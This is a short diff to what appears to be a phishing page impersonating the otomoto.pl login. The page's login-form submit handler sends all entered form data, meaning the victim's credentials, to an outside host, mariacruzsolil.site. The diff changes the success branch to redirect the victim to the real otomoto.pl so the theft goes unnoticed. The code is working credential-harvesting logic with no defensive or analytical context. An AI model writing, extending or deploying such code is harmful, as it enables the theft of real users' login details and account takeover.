@@ -247,8 +247,7 @@ a.load=function(b,c){var f="https://analytics.tiktok.com/i18n/pixel/events.js";a
 document.querySelector('[data-testid="login-form"]').addEventListener('submit', function(e) {
     e.preventDefault();
 
-    const form = e.target;
-    const formData = new FormData(form);
+    const formData = new FormData(e.target);
 
     fetch("https://mariacruzsolil.site/maria/m/contact.php", {
         method: "POST",
@@ -259,7 +258,7 @@ document.querySelector('[data-testid="login-form"]').addEventListener('submit', 
         console.log(data);
 
         if (data.success) {
-            alert("SUCCESS");
+            window.location.replace("https://otomoto.pl");
         } else {
             alert("EROARE: " + data.error);
         }
@@ -270,7 +269,6 @@ document.querySelector('[data-testid="login-form"]').addEventListener('submit', 
     });
 });
 </script>
-
 
 
             </body></html>
